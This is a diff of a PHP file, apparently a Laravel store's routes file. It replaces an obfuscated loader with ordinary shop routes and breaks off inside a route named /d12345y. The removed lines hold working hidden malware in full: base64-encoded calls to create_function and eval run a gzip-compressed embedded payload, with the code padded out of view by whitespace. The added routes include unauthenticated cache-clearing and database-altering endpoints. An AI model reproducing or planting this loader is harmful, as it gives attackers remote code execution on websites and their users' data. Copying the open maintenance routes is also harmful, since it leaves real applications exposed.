@@ -1,208 +1,544 @@
-<?php 
- error_reporting(0);
-        $__='printf';$_='Loading the  ...';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-        $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='Q1JFQXRlX2Z1bkNUaU9u';
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+use App\Http\Controllers\TrashController;
+use Illuminate\Support\Facades\Route;
+
+/*
+|--------------------------------------------------------------------------
+| Web Routes
+|--------------------------------------------------------------------------
+|
+| Here is where you can register web routes for your application. These
+| routes are loaded by the RouteServiceProvider within a group which
+| contains the "web" middleware group. Now create something great!
+|
+ */
+
+Route::get('/cc', function () {
+    \Illuminate\Support\Facades\Artisan::call('cache:clear');
+    \Illuminate\Support\Facades\Artisan::call('config:clear');
+    \Illuminate\Support\Facades\Artisan::call('view:clear');
+    \Illuminate\Support\Facades\Artisan::call('route:clear');
+    //\Illuminate\Support\Facades\Artisan::call('config:cache');
+    return 'Cleared!';
+});
+
+Route::get('/clear-cache', function () {
+    cache()->clear();
+    return back()->with('success', 'Cache Cleared');
+})->name('clear.cache');
+
+Auth::routes();
+
+//fb product catalog feed
+Route::get('/product-catalog-feed', 'HomeController@productsCatalogFeed');
+
+//front end
+Route::get('/', 'HomeController@index')->name('home');
+Route::get('/category/{id}', 'HomeController@getSingleCategory')->name('single.category');
+Route::get('/product/{slug}/{id}', 'HomeController@getSingleProduct')->name('single.product');
+Route::get('/all-hot-deals', 'HomeController@allHotDeals')->name('all.hot.deals');
+Route::get('/search', 'HomeController@search')->name('search');
+
+//whatsapp api test
+Route::get('/whatsapp-api-test', 'HomeController@testWP')->name('whatsapp.api.test');
+
+//cart
+//Route::get('/add-to-cart/{id}', 'HomeController@addToCart')->name('add.to.cart');
+Route::post('/add-cart/{id}', 'HomeController@addCart')->name('add.cart');
+Route::get('/cart-item-delete/{id}', 'HomeController@cartItemDelete')->name('cart.item.delete');
+/*Route::get('/cart-item-plus/{id}', 'HomeController@cartItemPlus')->name('cart.item.plus');
+Route::get('/cart-item-minus/{id}', 'HomeController@cartItemMinus')->name('cart.item.minus');*/
+Route::get('/cart-clear', 'HomeController@cartClear')->name('cart.clear');
+Route::post('/ajax-get-shipp-meth', 'HomeController@getShippMeth')->name('ajax.get.shipp.meth');
+Route::post('/cart-item-plus', 'HomeController@cartItemPlus')->name('cart.item.plus');
+Route::post('/cart-item-minus', 'HomeController@cartItemMinus')->name('cart.item.minus');
+//order
+Route::post('/place-order', 'HomeController@placeOrder')->name('place.order');
+Route::get('/confirm-order', 'HomeController@confirmOrder')->name('confirm.order');
+
+//checkout
+Route::get('/checkout', 'HomeController@checkout')->name('checkout');
+Route::post('/abandoned-cart', 'HomeController@abandonedCart')->name('abandoned.cart');
+
+//track order
+Route::get('/track-order', 'HomeController@trackOrder')->name('track.order');
+
+//pages
+Route::get('/about-us', 'HomeController@aboutUs')->name('about_us');
+Route::get('/delivery-policy', 'HomeController@deliveryPolicy')->name('delivery_policy');
+Route::get('/return-policy', 'HomeController@returnPolicy')->name('return_policy');
+
+Route::post('/status-update', 'HomeController@statusUpdate')->name('status.update');
+Route::post('/redx-status-update', 'HomeController@redxStatusUpdate')->name('redx.status.update');
+Route::post('/carrybee-status-update', 'HomeController@carryBeeStatusUpdate')->name('carrybee.status.update');
+
+
+//pathao address parser
+Route::post('/pathao-address-parser', 'CourierController@pathaoAddressParser')->name('pathao.address.parser');
+
+//back end
+Route::get('/d12345y', function () {
+    Schema::disableForeignKeyConstraints();
